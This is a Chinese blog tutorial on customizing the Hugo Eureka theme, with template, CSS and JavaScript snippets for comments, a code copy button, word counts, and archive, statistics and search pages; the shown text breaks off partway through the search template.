hugo中很多时候都会用到fontswesome的小插图，但是Eureka中好像有bug无法显示\n解决方法就是注册一下fontswesome并点击获取kit code代替/themes/eureka/layouts/partials/head.html中原本的链接：\n添加评论功能 使用 disqus Eureka中实现这点非常简单，你只需要注册disqus并获取shortname，填在params.yaml中就行： 相关阅读：\n给Hugo添加disqus评论服务 | Marvin\u0026rsquo;s Blog【程式人生】\n但是disqus在国内会被墙掉，要评论总是要使用魔法，比较麻烦，可以使用utterances\n使用utterances utterances和gittalk很像，都是使用GitHub issues的方式来保存评论\n具体配置如下：\n可以去utterances查看安装方式\n简单来说，需要在你的GitHub仓库内安装GitHub Apps - utterances · GitHub，然后配置好即可\n在代码旁增加复制按钮 在根目录 /static/css/ 和 /static/js/ 分别创建 copy-btn.css 和 copy-btn.js，分别写入：\n.highlight { position: relative; } .highlight td:first-child { user-select: none; } .highlight pre { padding-right: 75px; /* background-color: #f8f8f8 !important; */ } .highlight-copy-btn { position: absolute; top: 7px; right: 7px; border: 0; border-radius: 4px; padding: 1px; font-size: 0.8em; line-height: 1.8; /* color: #fff; background-color: #777; */ min-width: 55px; text-align: center; transition: 0.1s; opacity: 0.8; } .highlight-copy-btn:hover { opacity: 1; filter: drop-shadow(16px 16px 20px rgba(163, 163, 163, 0.178)); } // add-copy-btn.js (function () { \u0026#34;use strict\u0026#34;; if (!document.queryCommandSupported(\u0026#34;copy\u0026#34;)) { return; } function flashCopyMessage(el, msg) { el.textContent = msg; setTimeout(function () { el.textContent = \u0026#34;Copy\u0026#34;; }, 1000); } function selectText(node) { var selection = window.getSelection(); var range = document.createRange(); range.selectNodeContents(node); selection.removeAllRanges(); selection.addRange(range); return selection; } function addCopyButton(containerEl) { var copyBtn = document.createElement(\u0026#34;button\u0026#34;); copyBtn.className = \u0026#34;highlight-copy-btn\u0026#34;; copyBtn.textContent = \u0026#34;Copy\u0026#34;; var codeEl = containerEl.firstElementChild; copyBtn.addEventListener(\u0026#34;click\u0026#34;, function () { try { var selection = selectText(codeEl); navigator.clipboard.writeText(selection); selection.removeAllRanges(); flashCopyMessage(copyBtn, \u0026#34;Copied!\u0026#34;); } catch (e) { console \u0026amp;\u0026amp; console.log(e); flashCopyMessage(copyBtn, \u0026#34;Failed :(\u0026#34;); } }); containerEl.appendChild(copyBtn); } // Add copy button to code blocks var highlightBlocks = document.getElementsByClassName(\u0026#34;highlight\u0026#34;); Array.prototype.forEach.call(highlightBlocks, addCopyButton); })(); 然后在/themes/eureka/layouts/partials/footer.html末尾加上：\n\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;{{.Site.BaseURL}}css/copy-btn.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;{{.Site.BaseURL}}js/copy-btn.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 需要注意的是，Eureka主题还需更改config.yaml文件中markup-\u0026gt;highlight：\nmarkup: ## Do not modify markup.highlight highlight: codeFences: true noClasses: false guessSyntax : true lineNoStart : 1 tabWidth : 4 anchorLineNos : true lineAnchors : \u0026#39;\u0026#39; noHl : false 可能需要更改themes/eureka/assets/css/highlightjs.css为：\n/* hljs.js */ .hljs { background-color: transparent !important; color: var(--color-tertiary-text) !important; padding: 0 !important; position: relative; } 效果如图：\n在文章列表中显示tag 覆盖themes/eureka/layouts/partials/components/post-metadata.html为：\n\u0026lt;div class=\u0026#34;text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center\u0026#34; \u0026gt; \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-calendar me-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span \u0026gt;{{ .Date.Format (.Site.Params.dateFormat | default \u0026#34;2006-01-02\u0026#34;) }}\u0026lt;/span \u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-clock me-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;{{ i18n \u0026#34;readingTime\u0026#34; .ReadingTime }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; {{ with .GetTerms \u0026#34;categories\u0026#34; }} \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-folder me-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; {{ range $index, $value := . }} {{ if gt $index 0 }} \u0026lt;span\u0026gt;, \u0026lt;/span\u0026gt; {{ end -}} \u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34; class=\u0026#34;hover:text-eureka\u0026#34; \u0026gt;{{ .LinkTitle }}\u0026lt;/a \u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{ end }} {{ with .GetTerms \u0026#34;tags\u0026#34; }} \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-tag\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; {{ range $index, $value := . }} {{ if gt $index 0 }} \u0026lt;span\u0026gt;, \u0026lt;/span\u0026gt; {{ end -}} \u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34; class=\u0026#34;hover:text-eureka\u0026#34; \u0026gt;{{ .LinkTitle }}\u0026lt;/a \u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{ end }} {{ with .GetTerms \u0026#34;series\u0026#34; }} \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-th-list me-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; {{ range $index, $value := . }} {{ if gt $index 0 }} \u0026lt;span\u0026gt;, \u0026lt;/span\u0026gt; {{ end -}} \u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34; class=\u0026#34;hover:text-eureka\u0026#34; \u0026gt;{{ .LinkTitle }}\u0026lt;/a \u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; 在文章开头显示字数 Eureka默认只显示阅读用时，这有时候非常蛋疼，因为机器的阅读用时和我们人差距很大，没法直观地体现出文章有多长\n我们可以在themes/eureka/layouts/partials/components/post-metadata.html中阅读用时那个div前面增加：\n\u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-file-pen\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;本文共{{ plainify .WordCount }}字\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 也就是这里：\n使用obsidian模板自动生成文章头部 需要下载插件Templater，请阅读其官方文档中模板的写法（网上有些博客的教程是旧版的，现在已经不能用了）\n示例如下：\n使用时按Alt+E就行\n需要注意的是，为了避免hugo解析content文件夹中存放模板的model文件夹（模板文件夹必须存放在obsidian仓库内），我们需要在comfig.yaml中指定ignore的pattern：\n具体详见Configure Hugo |Hugo\n增强内容 下面会用到的外部js代码请下载此附件\n下载解压后放在/static/js中\n增加归档页 请务必下载外部js代码！\n在/themes/eureka/layouts/_default/文件夹下新建archive.html，并填入：\n{{/* layouts/_default/archive.html */}} {{ define \u0026#34;main\u0026#34; }} {{ $hasToc := and (in .TableOfContents \u0026#34;\u0026lt;li\u0026gt;\u0026#34; ) (.Params.toc) }} {{ $hasSidebar := or ($hasToc) (.Params.series) }} \u0026lt;div class=\u0026#34;grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-span-2 {{ if not $hasSidebar }} {{- print \u0026#34; lg:col-start-2\u0026#34; -}} {{ end }} lg:col-span-6 bg-secondary-bg rounded px-6 py-8\u0026#34;\u0026gt; \u0026lt;!-- \u0026lt;h1 class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; --\u0026gt; \u0026lt;h1 class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;归档\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;flex flex-wrap flex-row items-center my-2 text-tertiary-text\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-calendar mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;{{ .Date.Format (.Site.Params.dateFormat | default \u0026#34;2006-01-02\u0026#34;) }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ $featured := partial \u0026#34;utils/get-featured.html\u0026#34; . }} {{ with $featured }} \u0026lt;div class=\u0026#34;my-4\u0026#34;\u0026gt; {{ . }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;script type=\u0026#39;text/javascript\u0026#39; src=\u0026#34;{{.Site.BaseURL}}js/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .car-collapse .car-yearmonth { cursor: s-resize; } \u0026lt;/style\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; /* \u0026lt;![CDATA[ */ jQuery(document).ready(function () { jQuery(\u0026#39;.car-collapse\u0026#39;).find(\u0026#39;.car-monthlisting\u0026#39;).hide(); jQuery(\u0026#39;.car-collapse\u0026#39;).find(\u0026#39;.car-monthlisting:first\u0026#39;).show(); jQuery(\u0026#39;.car-collapse\u0026#39;).find(\u0026#39;.car-yearmonth\u0026#39;).click(function () { jQuery(this).next(\u0026#39;ul\u0026#39;).slideToggle(\u0026#39;fast\u0026#39;); }); jQuery(\u0026#39;.car-collapse\u0026#39;).find(\u0026#39;.car-toggler\u0026#39;).click(function () { if (\u0026#39;展开全部\u0026#39; == jQuery(this).text()) { jQuery(this).parent(\u0026#39;.car-container\u0026#39;).find(\u0026#39;.car-monthlisting\u0026#39;).show(); jQuery(this).text(\u0026#39;折叠全部\u0026#39;); } else { jQuery(this).parent(\u0026#39;.car-container\u0026#39;).find(\u0026#39;.car-monthlisting\u0026#39;).hide(); jQuery(this).text(\u0026#39;展开全部\u0026#39;); } return false; }); }); /* ]]\u0026gt; */ \u0026lt;/script\u0026gt; \u0026lt;div class=\u0026#34;car-container car-collapse\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;car-toggler\u0026#34; style=\u0026#34;color: darkgray;\u0026#34;\u0026gt;展开全部\u0026lt;/a\u0026gt; \u0026lt;ul class=\u0026#34;car-list\u0026#34;\u0026gt; {{ range (.Site.RegularPages.GroupByDate \u0026#34;2006年 01月\u0026#34;) }} \u0026lt;li\u0026gt; \u0026lt;span class=\u0026#34;car-yearmonth\u0026#34;\u0026gt;\u0026lt;span style=\u0026#34;color: rgba(255, 105, 105, 0.737);font-weight: bold;\u0026#34;\u0026gt;{{ .Key }}\u0026lt;/span\u0026gt; \u0026lt;span title=\u0026#34;Post Count\u0026#34;\u0026gt; 共{{ len .Pages }}篇\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;ul class=\u0026#34;car-monthlisting\u0026#34; style=\u0026#34;display: block;\u0026#34;\u0026gt; {{ range .Pages }} \u0026lt;li style=\u0026#34;text-indent:2em;\u0026#34;\u0026gt; \u0026lt;span style=\u0026#34;color: rgb(100, 100, 100);\u0026#34;\u0026gt;{{ .Date.Format \u0026#34;02日\u0026#34;}} \u0026lt;/span\u0026gt;\u0026lt;b\u0026gt;\u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34; style=\u0026#34;margin-left: 1em;\u0026#34;\u0026gt;{{ .Title }} \u0026lt;/a\u0026gt;\u0026lt;/b\u0026gt; \u0026lt;!-- \u0026lt;span title=\u0026#34;Comment Count\u0026#34;\u0026gt;(0)\u0026lt;/span\u0026gt; --\u0026gt; \u0026lt;/li\u0026gt; {{ end }} \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; {{ end }} \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ end }} 然后新建content/archive/archive.md并填入frontmatter：\n--- layout: archive title: \u0026#34;归档\u0026#34; date: 2022-12-29T3:01:44+08:00 draft: false --- 最后在menu.yaml加上对它的索引就好了：\n来源见Hugo 主题 Eureka 自定义 | 怡红院落\n增加统计页 请务必下载外部js代码！\n在/themes/eureka/layouts/_default/文件夹下新建stats.html，并填入：\n{{/* layouts/_default/stats.html */}} {{ define \u0026#34;main\u0026#34; }} {{- $.Scratch.Add \u0026#34;stats\u0026#34; slice -}} {{- range .Site.RegularPages -}} {{- $.Scratch.Add \u0026#34;stats\u0026#34; (dict \u0026#34;title\u0026#34; .Title \u0026#34;slug\u0026#34; .Slug \u0026#34;year\u0026#34; (.Date.Format \u0026#34;2006\u0026#34;) \u0026#34;month\u0026#34; (.Date.Format \u0026#34;2006-01\u0026#34;) \u0026#34;hour\u0026#34; (.Date.Format \u0026#34;15\u0026#34;) \u0026#34;week\u0026#34; (.Date.Format \u0026#34;Monday\u0026#34;) \u0026#34;count\u0026#34; .WordCount) -}} {{- end -}} {{ $hasToc := and (in .TableOfContents \u0026#34;\u0026lt;li\u0026gt;\u0026#34; ) (.Params.toc) }} {{ $hasSidebar := or ($hasToc) (.Params.series) }} \u0026lt;style\u0026gt; .chart { margin-top: 15px; width: 100%; height: 350px; } @keyframes rotation{ from {-webkit-transform: rotate(0deg);} to {-webkit-transform: rotate(360deg);} } @-webkit-keyframes rotation{ from {-webkit-transform: rotate(0deg);} to {-webkit-transform: rotate(360deg);} } i.icon-rotate{ transform: rotate(360deg); -webkit-transform: rotate(360deg); animation: rotation 1s linear infinite; -moz-animation: rotation 1s linear infinite; -webkit-animation: rotation 1s linear infinite; -o-animation: rotation 1s linear infinite; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-span-2 {{ if not $hasSidebar }} {{- print \u0026#34;lg:col-start-2\u0026#34; -}} {{ end }} lg:col-span-6 bg-secondary-bg rounded px-6 py-8\u0026#34;\u0026gt; \u0026lt;!-- \u0026lt;h1 class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; --\u0026gt; \u0026lt;h1 class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;统计\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;flex flex-wrap flex-row items-center my-2 text-tertiary-text\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-calendar mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;{{ .Date.Format (.Site.Params.dateFormat | default \u0026#34;2006-01-02\u0026#34;) }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ $featured := partial \u0026#34;utils/get-featured\u0026#34; . }} {{ with $featured }} \u0026lt;div class=\u0026#34;my-4\u0026#34;\u0026gt; {{ . }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p id=\u0026#34;basic-info\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa-solid fa-spinner icon-rotate\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;加载中...\u0026lt;/p\u0026gt; \u0026lt;h2 id=\u0026#34;文章数统计\u0026#34;\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;div id=\u0026#34;year-stat\u0026#34; class=\u0026#34;chart\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;month-stat\u0026#34; class=\u0026#34;chart\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;h2 id=\u0026#34;时间段统计\u0026#34;\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;div id=\u0026#34;hour-stat\u0026#34; class=\u0026#34;chart\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;weekday-stat\u0026#34; class=\u0026#34;chart\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ if $hasSidebar}} \u0026lt;div class=\u0026#34;col-span-2\u0026#34;\u0026gt; {{ if .GetTerms \u0026#34;series\u0026#34; }} {{ partial \u0026#34;components/post-series.html\u0026#34; . }} {{ end }} {{ if $hasToc }} {{ partial \u0026#34;components/post-toc.html\u0026#34; . }} {{ end }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;{{.Site.BaseURL}}js/echarts.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; const data = {{- $.Scratch.Get \u0026#34;stats\u0026#34; -}}; function showChart(id, title, type, d) { var chart = echarts.init(document.getElementById(id)); var xData = []; var yData = []; d.forEach(function(item) { xData.push(item[0]); yData.push(item[1]); }); var option = { title : { text : title }, tooltip : { trigger : \u0026#39;axis\u0026#39; }, xAxis : [ { type : \u0026#39;category\u0026#39;, data : xData } ], yAxis : [ { type : \u0026#39;value\u0026#39; } ], grid : { x : 35, y : 45, x2 : 35, y2 : 35 }, series : [ { type : \u0026#39;bar\u0026#39;, name : type, data : yData, markLine : { data : [ { type : \u0026#39;average\u0026#39;, name : \u0026#39;平均值\u0026#39; }], itemStyle : { normal : { color : \u0026#39;#4087bd\u0026#39; } } }, itemStyle : { normal : { color : \u0026#39;#87cefa\u0026#39; } } }] }; chart.setOption(option); } window.addEventListener(\u0026#39;load\u0026#39;, function() { basicInfo(); yearStats(); monthStats(); hourStats(); weekStats(); }); function basicInfo() { const articles = {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;posts\u0026#34;) }}; const writeup = {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;writeup\u0026#34;) }}; const principle = {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;principle\u0026#34;) }}; const tricks = {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;tricks\u0026#34;) }}; const pages = articles + writeup + principle + tricks; //const comments = data.reduce((count, article) =\u0026gt; count + article.comments, 0); const words = data.reduce((count, article) =\u0026gt; count + article.count, 0); document.querySelector(\u0026#39;#basic-info\u0026#39;).innerHTML = ` \u0026lt;span\u0026gt;总文章数：\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;${pages}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; 篇\u0026lt;/span\u0026gt;； \u0026lt;span\u0026gt;Posts：\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/posts/\u0026#34;\u0026gt;${articles}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; 篇\u0026lt;/span\u0026gt;； \u0026lt;span\u0026gt;WriteUps：\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/writeup/\u0026#34;\u0026gt;${writeup}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; 篇\u0026lt;/span\u0026gt;； \u0026lt;span\u0026gt;Tricks：\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/tricks/\u0026#34;\u0026gt;${tricks}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; 篇\u0026lt;/span\u0026gt;； \u0026lt;span\u0026gt;Principle：\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/principle/\u0026#34;\u0026gt;${principle}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; 篇\u0026lt;/span\u0026gt;； \u0026lt;span\u0026gt;总字数：\u0026lt;strong\u0026gt;${words}\u0026lt;/strong\u0026gt;\u0026lt;/span\u0026gt;； `; }; function yearStats() { const yearGroup = {}; data.forEach(article =\u0026gt; { const year = parseInt(article.year); if(!yearGroup.hasOwnProperty(year)) { yearGroup[year] = 0; } yearGroup[year] += 1; }); const d = []; for(let i = 2022; i \u0026lt;= (new Date().getFullYear()); i++) { d.push([i, yearGroup[i] || 0]); } showChart(\u0026#39;year-stat\u0026#39;, \u0026#39;文章数 - 按年统计\u0026#39;, \u0026#39;文章数\u0026#39;, d); } function monthStats() { const monthGroup = {}; data.forEach(article =\u0026gt; { if(!monthGroup.hasOwnProperty(article.month)) { monthGroup[article.month] = 0; } monthGroup[article.month] += 1; }); const d = []; for(let year = 2022; year \u0026lt;= (new Date().getFullYear()); year++) { for(let month = 1; month \u0026lt; 13; month++) { const text = `${year}-${month \u0026lt; 10 ? \u0026#39;0\u0026#39; + month : month}`; d.push([text, monthGroup[text] || 0]); } } showChart(\u0026#39;month-stat\u0026#39;, \u0026#39;文章数 - 按月统计\u0026#39;, \u0026#39;文章数\u0026#39;, d); } function hourStats() { const hourGroup = {}; data.forEach(article =\u0026gt; { const hour = parseInt(article.hour); if(!hourGroup.hasOwnProperty(hour)) { hourGroup[hour] = 0; } hourGroup[hour] += 1; }); const d = [ [\u0026#39;00:00-01:00\u0026#39;], [\u0026#39;01:00-02:00\u0026#39;], [\u0026#39;02:00-03:00\u0026#39;], [\u0026#39;03:00-04:00\u0026#39;], [\u0026#39;04:00-05:00\u0026#39;], [\u0026#39;05:00-06:00\u0026#39;], [\u0026#39;06:00-07:00\u0026#39;], [\u0026#39;07:00-08:00\u0026#39;], [\u0026#39;08:00-09:00\u0026#39;], [\u0026#39;09:00-10:00\u0026#39;], [\u0026#39;10:00-11:00\u0026#39;], [\u0026#39;11:00-12:00\u0026#39;], [\u0026#39;12:00-13:00\u0026#39;], [\u0026#39;13:00-14:00\u0026#39;], [\u0026#39;14:00-15:00\u0026#39;], [\u0026#39;15:00-16:00\u0026#39;], [\u0026#39;16:00-17:00\u0026#39;], [\u0026#39;17:00-18:00\u0026#39;], [\u0026#39;18:00-19:00\u0026#39;], [\u0026#39;19:00-20:00\u0026#39;], [\u0026#39;20:00-21:00\u0026#39;], [\u0026#39;21:00-22:00\u0026#39;], [\u0026#39;22:00-23:00\u0026#39;], [\u0026#39;23:00-24:00\u0026#39;] ].map((item, key) =\u0026gt; { item[1] = hourGroup[key] || 0; return item; }); showChart(\u0026#39;hour-stat\u0026#39;, \u0026#39;文章数 - 按时段统计\u0026#39;, \u0026#39;文章数\u0026#39;, d); } function weekStats() { const weekGroup = {}; data.forEach(article =\u0026gt; { if(!weekGroup.hasOwnProperty(article.week)) { weekGroup[article.week] = 0; } weekGroup[article.week] += 1; }); const d = [ [\u0026#39;星期一\u0026#39;, weekGroup.Monday], [\u0026#39;星期二\u0026#39;, weekGroup.Tuesday], [\u0026#39;星期三\u0026#39;, weekGroup.Wednesday], [\u0026#39;星期四\u0026#39;, weekGroup.Thursday], [\u0026#39;星期五\u0026#39;, weekGroup.Friday], [\u0026#39;星期六\u0026#39;, weekGroup.Saturday], [\u0026#39;星期日\u0026#39;, weekGroup.Sunday] ]; showChart(\u0026#39;weekday-stat\u0026#39;, \u0026#39;文章数 - 按星期几统计\u0026#39;, \u0026#39;文章数\u0026#39;, d); } \u0026lt;/script\u0026gt; {{ end }} 其中函数basicInfo可自定义显示的模块信息\n然后新建content/stats/stats.md并填入frontmatter：\n--- layout: stats title: \u0026#34;统计\u0026#34; date: 2022-12-29T3:01:44+08:00 draft: false slug: \u0026#34;stats\u0026#34; --- 来源：Hugo 主题 Eureka 自定义 | 怡红院落\n增加搜索功能 请务必下载外部js代码！\n在config.yaml中加上：\noutputs: home: - \u0026#34;HTML\u0026#34; - \u0026#34;RSS\u0026#34; - \u0026#34;JSON\u0026#34; 然后新建themes/eureka/layouts/index.json填入：\n{{- $.Scratch.Add \u0026#34;index\u0026#34; slice -}} {{- range .Site.RegularPages -}} {{- $.Scratch.Add \u0026#34;index\u0026#34; (dict \u0026#34;title\u0026#34; .Title \u0026#34;tags\u0026#34; .Params.tags \u0026#34;categories\u0026#34; .Params.categories \u0026#34;contents\u0026#34; .Plain \u0026#34;summary\u0026#34; .Summary \u0026#34;permalink\u0026#34; .Permalink \u0026#34;date\u0026#34; (.Date.Format \u0026#34;2006年01月02日\u0026#34;) \u0026#34;section\u0026#34; .Section) -}} {{- end -}} {{- $.Scratch.Get \u0026#34;index\u0026#34; | jsonify -}} 参见Hugo 之旅 | 怡红院落\n在themes/eureka/layouts/partials/header.html中找到有很多个div元素并列的地方，并加上：\n\u0026lt;div class=\u0026#34;flex\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;search-container relative pt-4 md:pt-0\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;search\u0026#34;\u0026gt; \u0026lt;form role=\u0026#34;search\u0026#34; class=\u0026#34;search-form\u0026#34; action=\u0026#34;/search.html\u0026#34; method=\u0026#34;get\u0026#34;\u0026gt; \u0026lt;label\u0026gt; \u0026lt;input name=\u0026#34;q\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;搜索 ...\u0026#34; class=\u0026#34;search-field\u0026#34;\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;button\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-magnifying-glass\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 然后在文件最上面加上：\n\u0026lt;style\u0026gt; .search-container { margin-top: -0.3rem; margin-right: 1rem; } .search-container .search { border: 1px solid #e2e8f0; border-radius: 4px; } .search-container input { padding-left: 1rem; line-height: 2rem; outline: none; background: transparent; } .search-container button { font-size: 0.8rem; margin-right: 0.5rem; color: #e2e8f0; } \u0026lt;/style\u0026gt; 然后新建themes/eureka/layouts/_default/search.html，内容如下：\n{{/* layouts/_default/search.html */}} {{ define \u0026#34;main\u0026#34; }} \u0026lt;div class=\u0026#34;w-full max-w-screen-xl lg:px-4 xl:px-8 mx-auto\u0026#34;\u0026gt; \u0026lt;article class=\u0026#34;mx-6 my-8\u0026#34;\u0026gt; \u0026lt;h1 id=\u0026#34;search-count\u0026#34; class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/article\u0026gt; \u0026lt;div id=\u0026#34;search-result\u0026#34; class=\u0026#34;bg-secondary-bg rounded overflow-hidden px-4 divide-y\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;{{.Site.BaseURL}}js/fuse.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;!-- \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/fuse.js/dist/fuse.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; --\u0026gt; \u0026lt;script\u0026gt; document.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, async () =\u0026gt; { const qs = new URLSearchParams(location.search); const searchResult = document.querySelector(\u0026#39;#search-result\u0026#39;); const searchCount = document.querySelector(\u0026#39;#search-count\u0026#39;); const fuseOptions = { shouldSort: true, includeMatches: true, threshold: 0.6, tokenize: true, location: 0, distance: 100, maxPatternLength: 32, minMatchCharLength: 1, findAllMatches: true, useExtendedSearch: true, keys: [{ name: \u0026#34;title\u0026#34;, weight: 0.8 }, { name: \u0026#34;summary\u0026#34;, weight: 0.2 }, { name: \u0026#34;tags\u0026#34;, weight: 0.6 }, { name: \u0026#34;catagories\u0026#34;, weight: 0.2 }, { name: \u0026#34;date\u0026#34;, weight: 0.3 }, ] }; let fuse = null async function getFuse() { if (fuse == null) { const resp = await fetch(\u0026#39;/index.json\u0026#39;, { method: \u0026#39;get\u0026#39; }) const indexData = await resp.json() fuse = new Fuse(indexData, fuseOptions); } return fuse } function render(items) { console.log(items); return items.map(item =\u0026gt; { item = item.item return ` \u0026lt;div class=\u0026#34;px-2 py-6\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col-reverse lg:flex-row justify-between\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;w-full lg:w-2/3\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;my-2\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mb-4\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;${item.permalink}\u0026#34; class=\u0026#34;font-bold text-xl hover:text-eureka\u0026#34;\u0026gt;${item.title}\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; ${item.summary} \u0026lt;p class=\u0026#34;more\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;${item.permalink}\u0026#34; title=\u0026#34;${item.title}\u0026#34;\u0026gt;阅读全文\u0026lt;span class=\u0026#34;meta-nav\u0026#34;\u0026gt;→\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;flex flex-wrap flex-row items-center my-2 text-tertiary-text\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34; style=\u0026#34;margin: 10px;\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-calendar mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;${item.date}\u0026lt;/span\u0026gt; 